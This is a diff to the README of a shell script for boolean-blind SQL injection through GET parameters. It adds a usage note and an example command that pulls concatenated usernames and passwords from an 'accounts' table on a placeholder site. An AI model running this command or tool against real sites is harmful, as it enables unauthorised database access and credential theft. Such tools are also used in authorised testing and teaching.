@@ -8,7 +8,9 @@ A really simple script for boolean-blind SQLi exploitation of vulnerable GET par
 ## Usage
   Syntax: `./blindsqli.sh 'http[s]://<URL>?<vulnparam>=<paramvalue>' '<SQL query>' '<String which appears when TRUE condition>'`
   
-  Example: `./blindsqli.sh 'http://vulnerable.site/sqli.php?id=1234' 'SELECT concat(username,":",password) FROM awd.accounts LIMIT 1,1' 'JohnDoe'"`
+  > Notice that the vulnerable GET parameter should be at the end of the URL. In the example below, _id_ is the vulnerable GET paramenter.
+  
+  Example: `./blindsqli.sh 'http://vulnerable.site/sqli.php?Submit=Submit&id=1234' 'SELECT concat(username,":",password) FROM awd.accounts LIMIT 1,1' 'JohnDoe'"`
     
 ## TODOs
   - [ ] Target POST parameters.
